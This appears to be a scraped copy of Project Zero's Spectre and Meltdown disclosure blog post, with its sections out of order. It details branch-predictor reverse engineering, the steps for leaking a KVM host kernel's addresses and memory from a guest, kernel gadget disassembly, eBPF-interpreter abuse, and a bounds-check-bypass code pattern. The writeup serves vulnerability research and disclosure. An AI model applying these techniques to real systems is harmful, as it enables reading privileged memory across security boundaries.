but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.) Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 | 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement. Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko). Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits. Reading host memory from a KVM guest Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded. Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12]. Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced. Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works. Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache. Variant 3: Rogue data cache load Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all. Ideas for further research We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless. Leaking without data cache timing It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution. Other microarchitectures Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked. Other JIT engines We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines. More efficient scanning for host-virtual addresses and cache sets In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed. Dumping the complete BTB state Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions. Variant 2: Leaking with more efficient gadgets If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2. Various speedups In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2. Leaking or injection through the return predictor If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far. Leaking data out of the indirect call predictor We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work. Vendor statements The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability: Intel Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf AMD AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution ARM Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations. Literature Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture. References [1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"Reading privileged memory with a side channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-privileged-memory-with-a-side-channel","text":"Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 .","title":"Reading privileged memory with a side-channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#tested-processors","text":"Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document)","title":"Tested Processors"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#glossary","text":"retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred.","title":"Glossary"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-1-bounds-check-bypass","text":"This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl.","title":"Variant 1: Bounds check bypass"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#theoretical-explanation","text":"The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] 